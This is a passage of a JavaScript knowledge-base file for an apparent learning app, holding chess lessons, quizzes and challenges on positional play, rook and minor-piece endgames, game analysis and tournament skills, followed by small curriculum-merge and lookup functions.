            hint: 'Same color as pawns.',
            why: 'Bad bishop is blocked by its own pawns on the same color squares, severely limiting its scope. Classic positional weakness.'
          },
          {
            q: 'What should you do when you have a space advantage?',
            choices: ['Give it back', 'Maneuver pieces, maintain pressure', 'Castle queenside', 'Trade everything'],
            answerIdx: 1,
            hint: 'Use the extra space.',
            why: 'With space advantage, maneuver pieces actively! You have room to reposition, opponent is cramped. Maintain pressure, improve pieces.'
          }
        ],
        quiz: [
          {
            q: 'What is a positional weakness that is permanent?',
            choices: ['Bad piece placement (fixable)', 'Weak square complex (semi-permanent)', 'King position', 'Time on clock'],
            answerIdx: 1,
            why: 'Weak squares (squares opponent cannot control with pawns) are semi-permanent since pawn moves are irreversible.'
          },
          {
            q: 'How do positional advantages typically convert to wins?',
            choices: ['Automatic checkmate', 'Accumulate until tactical opportunity arises', 'Never win', 'Draw by agreement'],
            answerIdx: 1,
            why: 'Positional advantages accumulate gradually. Eventually, the superior position creates tactical opportunities to win material or deliver mate.'
          },
          {
            q: 'What does "a knight on the rim is dim" mean?',
            choices: ['Knights are weak', 'Knights on edge squares control fewer squares', 'Knights need light', 'Medieval saying'],
            answerIdx: 1,
            why: 'Knights on edge squares (a/h files or 1/8 ranks) control fewer squares than centralized knights. Central knights are much stronger!'
          }
        ],
        recall: [
            'What is a space advantage?',
            'Explain the concept of a "good" vs "bad" bishop',
            'What are weak squares and how do you exploit them?',
            'Why is controlling open files important?'
          ],

        challenge: {
          type: 'chess',
          kind: 'analysis',
          title: 'Positional Mastery',
          timeMin: 35,
          brief: 'Analyze 3 positions: identify positional elements (space, bad pieces, weak squares), formulate improvement plans, and show how advantages accumulate.',
          positions: [
            { theme: 'space-advantage', tasks: ['identify advantage', 'plan to exploit', 'find improving moves'] },
            { theme: 'bad-bishop', tasks: ['identify bad piece', 'improvement plan', 'alternative: trade it'] },
            { theme: 'weak-squares', tasks: ['find weak squares', 'occupy them', 'convert advantage'] }
          ],
          requirements: ['identify positional elements', 'formulate concrete plans', 'demonstrate piece improvement', 'show accumulation'],
          passScore: 75,
          rewardNim: 5,
          xp: 180,
          evaluator: { type: 'chess', config: { mode: 'analysis', theme: 'positional', positions: 3, requirePlan: true } }
        }
      },
      {
        slug: 'complex-endgames',
        title: 'Complex Endgames: Rook & Minor Piece',
        estMin: 35,
        difficulty: 3,
        lesson: {
          tldr: 'Master rook endgames (most common), rook vs minor piece, and minor piece endgames. Precise technique is essential.',
          sections: [
            { h: 'Rook Endgame Principles', body: 'Rook endgames are most common (40% of all endgames). Principles: Activate rook (7th rank ideal). Cut off enemy king. Rooks behind passed pawns. Active king. Opposition matters less with rooks. Lucena and Philidor positions are foundational.' },
            { h: 'Rook vs Minor Piece', body: 'Rook vs bishop/knight: Rook usually wins with pawns. Without pawns: often drawn. Rook is ~5 points, minor piece ~3 points. Rook dominates in open positions. Minor piece hides in corner for draw. Fortresses exist but require precise placement.' },
            { h: 'Bishop vs Knight Endings', body: 'Generally equal but depend on pawn structure. Bishop: better in open positions, passed pawns on both sides. Knight: better in closed positions, fixed pawns, blockading. Opposite-colored bishops: often drawn even with extra pawns. Same-colored: technique matters.' }
          ],
          example: {
            lang: 'text',
            code: 'Lucena Position (Rook Endgame):\nWhite: Kg7, Rd1, Pawn e7\nBlack: Kg8, Re1\nWhite to move and win:\n1. Rf1! (build bridge)\n1...Re2 2. Kf7 Rf2+ 3. Ke6 Re2+\n4. Kd6 Rd2+ 5. Kc5 (king escapes checks)\nPawn promotes\n\nPhilidor Position (Rook Endgame):\nDefensive technique: keep rook on 6th rank\nWhen attacker advances pawn, check from side\nDraw with correct defense\n\nRook vs Bishop:\nRook usually wins if pawns present\nBishop draws in corner (Stalemate tricks)\nActivate rook, cut off king, push pawns\n\nBishop vs Knight:\nOpen position → Bishop better\nClosed position → Knight better\nOpposite colored bishops → Usually draw'
          },
          ask: 'Have you studied Lucena and Philidor positions?',
          keyPoints: [
            'Rook endgames: most common, critical to master',
            'Lucena: winning technique with pawn on 7th',
            'Philidor: defensive technique (draw)',
            'Rooks on 7th rank are powerful',
            'Rooks behind passed pawns',
            'Rook vs minor piece: Rook wins with pawns',
            'Bishop vs Knight: depends on pawn structure',
            'Opposite-colored bishops: drawish even up pawns'
          ],
          misconception: '"All rook endgames are drawn." No! Rook endgames are highly technical. Small mistakes decide the result.'
        },
        practice: [
          {
            q: 'What percentage of endgames are rook endgames?',
            choices: ['10%', '25%', '40%', '60%'],
            answerIdx: 2,
            hint: 'Very common.',
            why: 'Approximately 40% of all endgames are rook endgames, making them the most common endgame type. Essential to study!'
          },
          {
            q: 'In opposite-colored bishop endgames, what is typical?',
            choices: ['Always win', 'Often drawn even with extra pawns', 'Bishop duel', 'Illegal position'],
            answerIdx: 1,
            hint: 'Bishops on different colors.',
            why: 'Opposite-colored bishops often lead to draws even with material advantage because bishops control different colored squares, making breakthroughs difficult.'
          }
        ],
        quiz: [
          {
            q: 'What is the Lucena position?',
            choices: ['Opening trap', 'Winning rook endgame technique (pawn on 7th)', 'Middlegame plan', 'Illegal position'],
            answerIdx: 1,
            why: 'Lucena position is a fundamental rook endgame: technique to win when you have pawn on 7th rank, king in front, opponent rook checking. Build bridge to win!'
          },
          {
            q: 'What is the Philidor position?',
            choices: ['Winning technique', 'Defensive drawing technique in rook endgame', 'Opening system', 'Tactical motif'],
            answerIdx: 1,
            why: 'Philidor position is the defensive drawing technique in rook endgames: keep rook on 6th rank, check from side when opponent advances pawn.'
          },
          {
            q: 'When is a bishop generally better than a knight in endgames?',
            choices: ['Always', 'In open positions with passed pawns', 'In closed positions', 'Never'],
            answerIdx: 1,
            why: 'Bishops are generally better in open positions (pawns on one side, passed pawns) due to long-range power. Knights excel in closed positions.'
          }
        ],
        recall: [
            'Can rook and bishop beat a lone rook?',
            'What is the Lucena position?',
            'Name two key principles of rook endgames',
            'Why are rook endgames so common?'
          ],

        challenge: {
          type: 'chess',
          kind: 'endgame',
          title: 'Complex Endgame Technique',
          timeMin: 40,
          brief: 'Master complex endgames: win Lucena position, hold Philidor draw, win rook vs bishop, convert bishop vs knight advantage.',
          scenarios: [
            { theme: 'lucena', task: 'demonstrate winning technique', moveLimit: 20 },
            { theme: 'philidor', task: 'hold the draw', moveLimit: 30 },
            { theme: 'rook-vs-bishop', task: 'win with rook', moveLimit: 40 },
            { theme: 'bishop-vs-knight', task: 'convert advantage', moveLimit: 35 }
          ],
          requirements: ['precise technique', 'know theoretical positions', 'calculate accurately', 'demonstrate understanding'],
          passScore: 75,
          rewardNim: 6,
          xp: 190,
          evaluator: { type: 'chess', config: { mode: 'endgame', scenarios: 4, requirePrecision: true, theoretical: true } }
        }
      },
      {
        slug: 'game-analysis',
        title: 'Game Analysis & Improvement',
        estMin: 30,
        difficulty: 3,
        lesson: {
          tldr: 'Analyzing your games is the fastest way to improve. Learn to find mistakes, understand them, and prevent repetition.',
          sections: [
            { h: 'How to Analyze', body: 'Step 1: Play through game without engine, note critical moments. Step 2: Try to find improvements (candidate moves). Step 3: Use engine to find mistakes. Step 4: Understand WHY moves were mistakes (this is crucial!). Step 5: Note patterns to work on. Don\'t just look at engine evaluation — understand the ideas!' },
            { h: 'Types of Mistakes', body: 'Blunders: one-move mistakes (hanging pieces). Mistakes: multi-move errors. Inaccuracies: small imprecisions. Missing winning moves. Psychological mistakes (time trouble, panic). Focus on critical moments: where game was decided.' },
            { h: 'Creating a Study Plan', body: 'Identify weak areas from game analysis. Opening: study lines you played poorly. Tactics: solve puzzles on themes you missed. Endgames: study types you reached. Strategy: study similar pawn structures. Track progress — repeated mistakes show what needs work!' }
          ],
          example: {
            lang: 'text',
            code: 'Analysis Process:\n1. Replay game, annotate:\n   "Here I felt unsure" (critical moment)\n   "This felt wrong" (potential mistake)\n   \n2. Before engine, find alternatives:\n   "I played Nf3, but what about Nd4?"\n   \n3. Engine analysis:\n   Nf3: +0.5\n   Nd4: +1.5 (much better!)\n   \n4. Understand WHY Nd4 better:\n   "Centralizes knight, controls key squares"\n   \n5. Pattern recognition:\n   "I often miss knight centralization"\n   → Study similar positions\n\nWeakness Tracking:\nGame 1: Missed fork (tactic)\nGame 2: Hung piece (blunder)\nGame 3: Bad opening (theory)\nGame 5: Missed fork (tactic again)\n→ Priority: Study tactical patterns!'
          },
          ask: 'Do you analyze your games regularly?',
          keyPoints: [
            'Analyze without engine first',
            'Try to find improvements yourself',
            'Understand WHY moves are mistakes',
            'Focus on critical moments',
            'Identify patterns in your mistakes',
            'Create study plan based on weaknesses',
            'Track progress over multiple games',
            'Don\'t just memorize engine moves — understand ideas!'
          ],
          misconception: '"Just check the computer evaluation." No! Understanding WHY moves are good/bad is what improves your chess.'
        },
        practice: [
          {
            q: 'What should you do BEFORE using the engine to analyze?',
            choices: ['Nothing', 'Try to find improvements yourself', 'Check opening book', 'Resign'],
            answerIdx: 1,
            hint: 'Active learning.',
            why: 'Analyzing yourself before using engine forces active thinking. You learn much more by finding mistakes yourself than having computer show them.'
          },
          {
            q: 'What is most important when analyzing mistakes?',
            choices: ['Engine evaluation number', 'Understanding WHY move was wrong', 'Memorizing better move', 'Blaming opponent'],
            answerIdx: 1,
            hint: 'Understanding over memorization.',
            why: 'Understanding WHY a move was a mistake (what ideas you missed, what patterns to recognize) is what actually improves your chess.'
          }
        ],
        quiz: [
          {
            q: 'What are "critical moments" in a game?',
            choices: ['Every move', 'Moments where game was decided or options were complex', 'Only blunders', 'Opening moves'],
            answerIdx: 1,
            why: 'Critical moments are positions where the game\'s outcome was decided, or where you had multiple reasonable options and the choice mattered significantly.'
          },
          {
            q: 'How should you create a study plan?',
            choices: ['Random topics', 'Based on patterns in your mistakes', 'Only study openings', 'Copy grandmaster'],
            answerIdx: 1,
            why: 'Effective study plan comes from analyzing your games, identifying weak areas (patterns in mistakes), then studying those specific topics.'
          },
          {
            q: 'What does tracking mistakes across multiple games reveal?',
            choices: ['Nothing useful', 'Patterns showing what needs focused study', 'Opponent weaknesses', 'Opening repertoire'],
            answerIdx: 1,
            why: 'Repeated mistake patterns across games reveal specific weaknesses to focus on (e.g., missing forks, poor opening, weak endgames).'
          }
        ],
        recall: [
            'What should you focus on when analyzing your games?',
            'How do you identify the critical moment in a game?',
            'Why should you analyze losses more than wins?',
            'What role does an engine play in analysis?'
          ],

        challenge: {
          type: 'chess',
          kind: 'analysis',
          title: 'Complete Game Analysis',
          timeMin: 40,
          brief: 'Analyze a complete master game: identify critical moments, find candidate moves, evaluate alternatives, and explain key ideas. Then analyze one of your own games.',
          games: [
            { type: 'master-game', task: 'full analysis with critical moments' },
            { type: 'own-game', task: 'identify mistakes and create study plan' }
          ],
          requirements: ['identify 5+ critical moments', 'find alternatives', 'explain ideas (not just moves)', 'create personalized study plan'],
          passScore: 75,
          rewardNim: 5,
          xp: 180,
          evaluator: { type: 'chess', config: { mode: 'analysis', requireExplanations: true, checkUnderstanding: true } }
        }
      },
      {
        slug: 'tournament-skills',
        title: 'Tournament Skills & Practical Play',
        estMin: 30,
        difficulty: 3,
        lesson: {
          tldr: 'Tournament chess requires practical skills beyond chess knowledge: time management, psychology, decision-making under pressure.',
          sections: [
            { h: 'Time Management', body: 'Don\'t spend all time on one move! Allocate time: more for critical positions, less for obvious moves. Use increment wisely. If unsure between moves, spend time. If position clear, move quickly. Avoid time trouble! Blunders increase dramatically under time pressure. Pre-move routine: quick blunder check every move.' },
            { h: 'Psychological Factors', body: 'Stay calm after mistakes — emotions lead to more mistakes. Play the board, not the rating. Don\'t assume opponent will find best move. Set practical problems. If worse, complicate! If better, simplify. Watch opponent\'s time. Use opponent\'s time to think ahead.' },
            { h: 'Practical Decision Making', body: 'Sometimes "good enough" move is better than finding "best" move that takes 10 minutes. Unclear position? Play forcing moves or improve worst piece. Learn when to offer/accept draws. Study tournament regulations. Physical preparation: sleep, nutrition, hydration matter!' }
          ],
          example: {
            lang: 'text',
            code: 'Time Management:\n40 moves in 90 minutes:\n  Average: 2.25 min/move\n  Opening (moves 1-10): 30 seconds/move\n  Middlegame (11-25): 3-4 min/move\n  Tactics: 5+ minutes\n  Obvious moves: 10 seconds\n  \nPsychology:\nYou blunder your queen:\n❌ "I\'m terrible!" → More mistakes\n✓ "Look for counterplay" → Fight back\n\nPractical Play:\nBetter position → Simplify, trade pieces\nWorse position → Complicate, create threats\nEqual position → Play for small advantage\n\nOpponent low on time:\nCreate complications! Force decisions\n\nYou low on time:\nPlay solid, avoid complications\nGet to time control safely'
          },
          ask: 'How do you manage time in your games?',
          keyPoints: [
            'Allocate time based on position complexity',
            'Avoid time trouble — blunders increase',
            'Stay calm after mistakes',
            'Play the board, not the rating',
            'Better position → simplify',
            'Worse position → complicate',
            'Use opponent\'s time to think',
            'Physical preparation matters',
            '"Good enough" can be better than "perfect" taking too long'
          ],
          misconception: '"Strong players always find best moves." No! They find good moves quickly and save time for critical moments.'
        },
        practice: [
          {
            q: 'What should you do if you have a much better position?',
            choices: ['Attack recklessly', 'Simplify by trading pieces', 'Complicate everything', 'Offer draw'],
            answerIdx: 1,
            hint: 'Reduce counterplay.',
            why: 'With better position, simplify by trading pieces! Reduces opponent\'s counterplay chances, makes advantage easier to convert.'
          },
          {
            q: 'What should you do if you\'re low on time?',
            choices: ['Think even longer', 'Play solid moves, avoid complications', 'Resign', 'Complicate position'],
            answerIdx: 1,
            hint: 'Reduce risk.',
            why: 'Low on time: play solid, avoid complications. Goal is reach time control without blundering. Complications invite mistakes in time pressure.'
          }
        ],
        quiz: [
          {
            q: 'Why do blunders increase in time trouble?',
            choices: ['Players get unlucky', 'No time for blunder-checking routine', 'Pieces move differently', 'Clock is cursed'],
            answerIdx: 1,
            why: 'Time trouble prevents proper blunder-checking. Players move quickly without verifying hanging pieces, checks, tactics — blunders spike!'
          },
          {
            q: 'What does "play the board, not the rating" mean?',
            choices: ['Ignore ratings', 'Focus on position, not opponent strength assumptions', 'Only play unrated', 'Play computer'],
            answerIdx: 1,
            why: 'Don\'t assume higher-rated opponent will find everything or lower-rated will blunder. Play the position objectively, not your perception of opponent.'
          },
          {
            q: 'If your opponent is low on time, what strategy makes sense?',
            choices: ['Offer draw', 'Create complications forcing decisions', 'Play slowly', 'Resign'],
            answerIdx: 1,
            why: 'When opponent is low on time, create complications! Force them to calculate under time pressure, increasing blunder likelihood.'
          }
        ],
        recall: [
            'Name three key aspects of tournament preparation',
            'What is an opening repertoire?',
            'How do you prepare against a specific opponent?',
            'Why is physical fitness important for chess?'
          ],

        challenge: {
          type: 'chess',
          kind: 'simulation',
          title: 'Tournament Simulation',
          timeMin: 40,
          brief: 'Play 3 rapid games (10 minutes each) demonstrating: good time management, staying calm after mistakes, practical decision-making in better/worse/equal positions.',
          games: [
            { timeControl: '10+0', scenario: 'better-position', task: 'simplify and convert' },
            { timeControl: '10+0', scenario: 'worse-position', task: 'complicate and fight' },
            { timeControl: '10+0', scenario: 'time-pressure', task: 'manage time correctly' }
          ],
          requirements: ['good time management', 'appropriate strategy for position', 'maintain composure', 'practical play'],
          passScore: 75,
          rewardNim: 6,
          xp: 200,
          evaluator: { type: 'chess', config: { mode: 'tournament-sim', games: 3, timeControl: '10+0', evaluatePracticalSkills: true } }
        }
      }
    ],
    finalAssessment: {
      type: 'chess',
      kind: 'comprehensive',
      title: 'Chess Master Assessment',
      timeMin: 60,
      brief: 'Demonstrate mastery across all areas: solve tactical puzzles, play correct opening moves, win endgame positions, and analyze a complex position with the AI coach.',
      requirements: [
        'solve 10 tactical puzzles (various themes)',
        'demonstrate 3 opening lines accurately',
        'win 2 endgame positions',
        'analyze a master game position and explain the key ideas'
      ],
      passScore: 75,
      rewardNim: 12,
      xp: 600,
      evaluator: {
        type: 'chess',
        config: {
          mode: 'comprehensive',
          puzzles: 10,
          openings: 3,
          endgames: 2,
          analysis: 1,
          aiCoaching: true
        }
      }
    }
  }),
};

/* ── curriculum merge ────────────────────────────────────────────────
   Registers the Nimiq skill and enriches every existing topic with
   objectives, story hooks, memory hooks, mid-lesson quizzes and recall
   drills (see ./curriculum/*). */
KB['nimiq-blockchain'] = NIMIQ_KB;
for (const [skillSlug, topics] of Object.entries(ENRICH)) {
  const kb = KB[skillSlug];
  if (!kb) continue;
  for (const t of kb.topics) {
    const e = topics[t.slug];
    if (!e) continue;
    if (e.objectives) t.objectives = e.objectives;
    if (e.story) t.story = e.story;
    if (e.memoryHook) t.memoryHook = e.memoryHook;
    if (e.quiz) t.quiz = e.quiz;
    if (e.recall) t.recall = e.recall;
  }
}

// Keep recall present even for domains that do not have a hand-authored
// enrichment map yet. Cybersecurity lessons still get prompts grounded in
// their own question and key points.
for (const topic of KB.cybersecurity?.topics || []) {
  if (Array.isArray(topic.lesson?.recall) && topic.lesson.recall.length) continue;
  const recall = [];
  if (topic.lesson?.ask) recall.push(`Without looking back, answer: ${topic.lesson.ask}`);
  const points = Array.isArray(topic.lesson?.keyPoints) ? topic.lesson.keyPoints.slice(0, 3) : [];
  if (points.length) recall.push(`From memory, explain these ideas: ${points.join('; ')}.`);
  if (recall.length) topic.lesson.recall = recall;
}

/** Domain suggestion for a free-text goal. */
export function suggestDomain(goal) {
  const g = String(goal || '').toLowerCase();
  let best = null, bestScore = 0;
  for (const [slug, kb] of Object.entries(KB)) {
    let score = 0;
    for (const kw of kb.goalKeywords || []) {
      if (g.includes(kw)) score += kw.length >= 5 ? 3 : 2;
    }
    if (score > bestScore) { bestScore = score; best = slug; }
  }
  return bestScore >= 2 ? { domain: best, confident: true } : { domain: best || 'web-development', confident: false };
}

export const skillKb = (slug) => KB[slug] || null;
export const topicBySlug = (domain, slug) => (KB[domain]?.topics || []).find((t) => t.slug === slug) || null;
